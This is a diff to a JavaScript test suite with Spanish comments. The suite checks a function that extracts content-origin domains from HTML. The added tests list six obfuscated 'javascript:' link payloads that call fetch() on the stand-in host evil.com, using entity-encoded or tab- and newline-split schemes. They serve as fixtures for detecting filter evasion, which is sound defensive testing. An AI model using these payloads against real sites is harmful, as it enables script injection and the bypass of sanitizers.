@@ -339,5 +339,29 @@ describe('un hipervínculo no es un origen de contenido', () => {
     expect(
       dominiosDe(`<a href="https://link.example.com/r?u=https://destino.example.com">ir</a>`),
     ).toEqual([]);
+    expect(dominiosDe(`<a href="//cdn.example.com/pagina">x</a>`)).toEqual([]);
+    expect(dominiosDe(`<a href="   https://norma.example.com/x">x</a>`)).toEqual([]);
+  });
+
+  // **Ofuscaciones del esquema.** Las seis las EJECUTA el navegador: el parser de HTML
+  // decodifica las entidades del valor del atributo antes de que la URL exista, y el
+  // analizador de URL descarta TAB, LF, CR y los controles C0 iniciales antes de leer el
+  // esquema. Preguntar «¿qué esquema declara?» obliga a reproducir esa normalización con
+  // expresiones regulares, que es donde vive una familia entera de evasiones.
+  //
+  // La pregunta que sí discrimina es otra: **¿el `href` ES la URL, o la lleva ADENTRO de
+  // otra cosa?** Las seis la llevan adentro, y ninguna empieza por ella.
+  it('ninguna ofuscación del esquema gana la exención', () => {
+    const casos = [
+      `<a href="&#106;avascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="&#x6a;avascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="java\tscript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="java\nscript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="java&#9;script:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="javascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+    ];
+    // En bloque y no en un bucle: un `for` con `expect` adentro corta en el primero que
+    // falla y esconde los otros cinco. Así el rojo muestra las seis de una.
+    expect(casos.map(dominiosDe)).toEqual(casos.map(() => ['https://evil.com']));
   });
 });
